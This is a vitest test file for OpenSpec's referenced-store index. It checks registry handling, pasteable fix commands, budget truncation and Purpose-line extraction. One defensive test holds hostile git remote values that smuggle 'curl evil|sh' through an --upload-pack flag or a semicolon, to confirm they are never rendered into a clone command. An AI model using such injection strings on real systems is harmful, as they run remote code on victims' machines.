import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

import {
  assembleReferenceIndex,
  extractFirstPurposeLine,
  renderReferencedStoresBlock,
  renderReferencedStoresSection,
} from '../../src/core/references.js';
import {
  readStoreRegistryState,
  writeStoreMetadataState,
  writeStoreRegistryState,
} from '../../src/core/store/foundation.js';
import type { ResolvedOpenSpecRoot } from '../../src/core/root-selection.js';
import { createOpenSpecRoot, writeSpec } from '../helpers/openspec-fixtures.js';

describe('reference index assembly', () => {
  let tempDir: string;
  let globalDataDir: string;
  let savedXdgDataHome: string | undefined;

  beforeEach(() => {
    tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'openspec-references-'));
    globalDataDir = path.join(tempDir, 'data', 'openspec');
    // Backstop: store calls below thread `globalDataDir`, but if a future
    // edit forgets one, the path resolver falls back to XDG_DATA_HOME and
    // then to the real ~/.local/share/openspec. Pin XDG at the temp dir so
    // a missed arg can never pollute the developer's home registry.
    savedXdgDataHome = process.env.XDG_DATA_HOME;
    process.env.XDG_DATA_HOME = path.join(tempDir, 'xdg');
  });

  afterEach(() => {
    if (savedXdgDataHome === undefined) {
      delete process.env.XDG_DATA_HOME;
    } else {
      process.env.XDG_DATA_HOME = savedXdgDataHome;
    }
    fs.rmSync(tempDir, { recursive: true, force: true });
  });

  function mkdir(relativePath: string): string {
    const dir = path.join(tempDir, relativePath);
    fs.mkdirSync(dir, { recursive: true });
    return dir;
  }

  async function registerStore(
    id: string,
    options: { healthyRoot?: boolean; metadataId?: string | null } = {}
  ): Promise<string> {
    const storeRoot = mkdir(`stores/${id}`);
    if (options.healthyRoot !== false) {
      createOpenSpecRoot(storeRoot);
    }
    if (options.metadataId !== null) {
      await writeStoreMetadataState(storeRoot, {
        version: 1,
        id: options.metadataId ?? id,
      });
    }

    const existing = await readStoreRegistryState({ globalDataDir }).catch(() => null);
    await writeStoreRegistryState(
      {
        version: 1,
        stores: {
          ...(existing?.stores ?? {}),
          [id]: { backend: { type: 'git', local_path: storeRoot } },
        },
      },
      { globalDataDir }
    );

    return storeRoot;
  }

  function appRoot(): ResolvedOpenSpecRoot {
    const rootDir = mkdir('app-repo');
    createOpenSpecRoot(rootDir);
    return {
      path: rootDir,
      source: 'nearest',
      changesDir: path.join(rootDir, 'openspec', 'changes'),
      defaultSchema: 'spec-driven',
    } as ResolvedOpenSpecRoot;
  }

  async function assemble(references: string[], resolvedRoot = appRoot()) {
    return assembleReferenceIndex({
      references: references.map((id) => ({ id })),
      resolvedRoot,
      globalDataDir,
    });
  }

  it('indexes a resolved store with first-Purpose-line summaries and the fetch recipe', async () => {
    const storeRoot = await registerStore('team-context');
    writeSpec(
      storeRoot,
      'billing',
      '# billing\n\n## Purpose\n\nBilling must support usage-based invoicing.\nMore detail here.\n\n## Requirements\n'
    );
    writeSpec(storeRoot, 'auth-sso', '# auth\n\n## Requirements\n\nNo purpose section.\n');

    const entries = await assemble(['team-context']);

    expect(entries).toHaveLength(1);
    const entry = entries[0];
    expect(entry.store_id).toBe('team-context');
    expect(entry.root).toBe(fs.realpathSync.native(storeRoot));
    expect(entry.specs).toEqual([
      { id: 'auth-sso', summary: '' },
      { id: 'billing', summary: 'Billing must support usage-based invoicing.' },
    ]);
    expect(entry.fetch).toBe('openspec show <spec-id> --type spec --store team-context');
    expect(entry.status).toEqual([]);
  });

  it('indexes a resolved store with zero specs as an empty entry', async () => {
    await registerStore('empty-context');

    const entries = await assemble(['empty-context']);

    expect(entries).toHaveLength(1);
    expect(entries[0].specs).toEqual([]);
    expect(entries[0].status).toEqual([]);
  });

  it('degrades an unregistered reference to reference_unresolved with a pasteable fix', async () => {
    const entries = await assemble(['missing-context']);

    expect(entries).toHaveLength(1);
    expect(entries[0].root).toBeUndefined();
    expect(entries[0].status[0]).toEqual(
      expect.objectContaining({
        severity: 'warning',
        code: 'reference_unresolved',
        fix: expect.stringContaining('openspec store register <path> --id missing-context'),
      })
    );
  });

  it('renders a verbatim clone fix when the declaration carries a remote (3.3)', async () => {
    const checkout = path.join(os.homedir(), 'openspec', 'missing-context');
    const entries = await assembleReferenceIndex({
      references: [{ id: 'missing-context', remote: 'https://192.0.2.1/team.git' }],
      resolvedRoot: appRoot(),
      globalDataDir,
    });

    // Quote style is platform-deliberate: POSIX single quotes; win32
    // double quotes (cmd/PowerShell treat single quotes as literal).
    const q = process.platform === 'win32' ? '"' : "'";
    expect(entries[0].status[0].fix).toBe(
      `git clone -- https://192.0.2.1/team.git ${q}${checkout}${q} && openspec store register ${q}${checkout}${q} --id missing-context`
    );

    // An invalid id wins over any declared remote.
    const invalid = await assembleReferenceIndex({
      references: [{ id: 'BAD ID', remote: 'https://192.0.2.1/team.git' }],
      resolvedRoot: appRoot(),
      globalDataDir,
    });
    expect(invalid[0].status[0].code).toBe('reference_invalid_id');
    expect(invalid[0].status[0].fix).not.toContain('git clone');
  });

  it('refuses to render shell-unsafe remotes into the clone fix', async () => {
    // Flag-like or metacharacter-bearing remotes from a repo-committed
    // config must never reach a command agents execute verbatim.
    for (const hostile of [
      '--upload-pack=sh -c "curl evil|sh" repo',
      'x.git; curl evil|sh',
      'a b.git',
      "quote'.git",
    ]) {
      const entries = await assembleReferenceIndex({
        references: [{ id: 'missing-context', remote: hostile }],
        resolvedRoot: appRoot(),
        globalDataDir,
      });
      expect(entries[0].status[0].fix).not.toContain('git clone');
      expect(entries[0].status[0].fix).toContain('Get a checkout from a teammate');
    }
  });

  it('degrades an invalid id to reference_invalid_id', async () => {
    const entries = await assemble(['BAD ID']);

    expect(entries[0].status[0]).toEqual(
      expect.objectContaining({ severity: 'warning', code: 'reference_invalid_id' })
    );
  });

  it('degrades unhealthy and mismatched stores to reference_root_unhealthy', async () => {
    await registerStore('hollow-context', { healthyRoot: false });
    await registerStore('mismatched-context', { metadataId: 'someone-else' });

    const entries = await assemble(['hollow-context', 'mismatched-context']);

    for (const entry of entries) {
      expect(entry.status[0]).toEqual(
        expect.objectContaining({
          severity: 'warning',
          code: 'reference_root_unhealthy',
          fix: expect.stringContaining('openspec store doctor'),
        })
      );
    }
  });

  it('degrades every reference when the registry is unreadable', async () => {
    const registryDir = path.join(globalDataDir, 'stores');
    fs.mkdirSync(registryDir, { recursive: true });
    fs.writeFileSync(path.join(registryDir, 'registry.yaml'), ':[ not yaml');

    const entries = await assemble(['team-context', 'other-context']);

    expect(entries).toHaveLength(2);
    for (const entry of entries) {
      expect(entry.status[0].code).toBe('reference_registry_unreadable');
    }
  });

  it('skips spec content, fetch recipes, and the budget in health mode (3.6)', async () => {
    const storeRoot = await registerStore('team-context');
    // A corpus that would trip the 50KB budget with content included.
    for (let i = 0; i < 60; i++) {
      writeSpec(storeRoot, `spec-${i}`, `## Purpose\n\n${'x'.repeat(1200)}\n`);
    }

    const entries = await assembleReferenceIndex({
      references: [{ id: 'team-context' }],
      resolvedRoot: appRoot(),
      globalDataDir,
      includeSpecs: false,
    });

    expect(entries).toEqual([{ store_id: 'team-context', root: expect.any(String), status: [] }]);
    expect('specs' in entries[0]).toBe(false);
    expect('fetch' in entries[0]).toBe(false);
    expect(entries[0].status).toEqual([]); // no reference_index_truncated, ever
  });

  it('uses injected registry entries with the [] vs null semantics (3.6)', async () => {
    // Injected []: empty registry, references degrade to unresolved.
    const empty = await assembleReferenceIndex({
      references: [{ id: 'team-context' }],
      resolvedRoot: appRoot(),
      globalDataDir,
      registryEntries: [],
    });
    expect(empty[0].status[0].code).toBe('reference_unresolved');

    // Injected null: unreadable registry.
    const unreadable = await assembleReferenceIndex({
      references: [{ id: 'team-context' }],
      resolvedRoot: appRoot(),
      globalDataDir,
      registryEntries: null,
    });
    expect(unreadable[0].status[0].code).toBe('reference_registry_unreadable');
  });

  it('keeps registry-independent checks first under a corrupt registry', async () => {
    const registryDir = path.join(globalDataDir, 'stores');
    fs.mkdirSync(registryDir, { recursive: true });
    fs.writeFileSync(path.join(registryDir, 'registry.yaml'), ':[ not yaml');

    const root = mkdir('self-store');
    createOpenSpecRoot(root);
    const entries = await assembleReferenceIndex({
      references: [{ id: 'BAD ID' }, { id: 'self-store' }],
      resolvedRoot: {
        path: root,
        source: 'store',
        storeId: 'self-store',
        changesDir: path.join(root, 'openspec', 'changes'),
        defaultSchema: 'spec-driven',
      } as ResolvedOpenSpecRoot,
      globalDataDir,
    });

    // Invalid grammar is invalid regardless of the registry; a
    // by-id self-reference stays silently omitted.
    expect(entries).toHaveLength(1);
    expect(entries[0].status[0].code).toBe('reference_invalid_id');
  });

  it('omits self-references silently, by id and by path', async () => {
    const storeRoot = await registerStore('self-context');
    writeSpec(storeRoot, 'anything', '## Purpose\n\nA spec.\n');

    const byId = await assembleReferenceIndex({
      references: [{ id: 'self-context' }],
      resolvedRoot: {
        path: storeRoot,
        source: 'store',
        storeId: 'self-context',
        changesDir: path.join(storeRoot, 'openspec', 'changes'),
        defaultSchema: 'spec-driven',
      } as ResolvedOpenSpecRoot,
      globalDataDir,
    });
    expect(byId).toEqual([]);

    const byPath = await assembleReferenceIndex({
      references: [{ id: 'self-context' }],
      resolvedRoot: {
        path: storeRoot,
        source: 'nearest',
        changesDir: path.join(storeRoot, 'openspec', 'changes'),
        defaultSchema: 'spec-driven',
      } as ResolvedOpenSpecRoot,
      globalDataDir,
    });
    expect(byPath).toEqual([]);
  });

  it('truncates at the 50KB budget with an order-preserving keep and a warning', async () => {
    const storeRoot = await registerStore('huge-context');
    // Summaries cap at ~300 rendered chars (sanitizeInline), so the
    // 50KB budget is tripped by COUNT: 250 specs x ~310 bytes.
    const longSummary = 'x'.repeat(5000);
    for (let i = 0; i < 250; i++) {
      writeSpec(
        storeRoot,
        `spec-${String(i).padStart(3, '0')}`,
        `## Purpose\n\n${longSummary}\n`
      );
    }

    const entries = await assemble(['huge-context']);
    const entry = entries[0];

    expect(entry.specs!.length).toBeGreaterThan(0);
    expect(entry.specs!.length).toBeLessThan(250);
    expect(entry.specs!.map((spec) => spec.id)).toEqual(
      entry.specs!.map((_, i) => `spec-${String(i).padStart(3, '0')}`)
    );
    expect(entry.status[0]).toEqual(
      expect.objectContaining({
        code: 'reference_index_truncated',
        fix: expect.stringContaining('openspec list --specs --store huge-context'),
      })
    );

    // The budget holds against the real rendering, in bytes; only the
    // truncation warning's own lines are exempt.
    const rendered = renderReferencedStoresBlock(entries);
    const exempt =
      Buffer.byteLength(`  Note: ${entry.status[0].message}\n  Fix: ${entry.status[0].fix}\n`);
    expect(Buffer.byteLength(rendered, 'utf-8')).toBeLessThanOrEqual(50 * 1024 + exempt);
    // The rendered block states the truncation, not just an orphan fix.
    expect(rendered).toContain('Note: Referenced store \'huge-context\' index truncated');
  });

  it('renders the XML block and markdown section consistently', async () => {
    const storeRoot = await registerStore('team-context');
    writeSpec(storeRoot, 'billing', '## Purpose\n\nUsage-based invoicing.\n');
    writeSpec(storeRoot, 'bare', '## Requirements\n\nNothing else.\n');

    const entries = await assemble(['team-context', 'missing-context']);
    const block = renderReferencedStoresBlock(entries);
    const section = renderReferencedStoresSection(entries);

    expect(block).toContain('<referenced_stores>');
    expect(block).toContain('Read-only upstream context. Fetch what you need; cite what you use.');
    expect(block).toContain('  - billing: Usage-based invoicing.');
    expect(block).toContain('  - bare');
    expect(block).not.toContain('  - bare:');
    expect(block).toContain('Fetch: openspec show <spec-id> --type spec --store team-context');
    expect(block).toContain("Store missing-context: Referenced store 'missing-context' is not registered on this machine.");
    expect(block).toContain('Fix: Get a checkout from a teammate and run: openspec store register <path> --id missing-context');

    expect(section).toContain('### Referenced Stores');
    expect(section).toContain('  - billing: Usage-based invoicing.');
  });
});

describe('extractFirstPurposeLine', () => {
  it('returns the first non-empty line under the Purpose heading', () => {
    expect(extractFirstPurposeLine('# t\n\n## Purpose\n\n\nFirst line.\nSecond.\n')).toBe(
      'First line.'
    );
  });

  it('returns empty for missing Purpose, empty Purpose, and unparseable content', () => {
    expect(extractFirstPurposeLine('# t\n\n## Requirements\n\nStuff.\n')).toBe('');
    expect(extractFirstPurposeLine('## Purpose\n\n## Requirements\n')).toBe('');
    expect(extractFirstPurposeLine('')).toBe('');
  });

  it('matches the heading case-insensitively at any level', () => {
    expect(extractFirstPurposeLine('### purpose\nIt works.\n')).toBe('It works.');
  });

  it('ignores headings inside fenced code blocks', () => {
    expect(
      extractFirstPurposeLine(
        '```markdown\n## Purpose\nTemplate text.\n```\n\n## Purpose\n\nReal summary.\n'
      )
    ).toBe('Real summary.');
    expect(
      extractFirstPurposeLine('```md\n## Purpose\n## Requirements\n```\n\n## Purpose\n\nStill found.\n')
    ).toBe('Still found.');
  });

  it('accepts CommonMark closing hashes', () => {
    expect(extractFirstPurposeLine('## Purpose ##\n\nClosed heading.\n')).toBe('Closed heading.');
  });
});
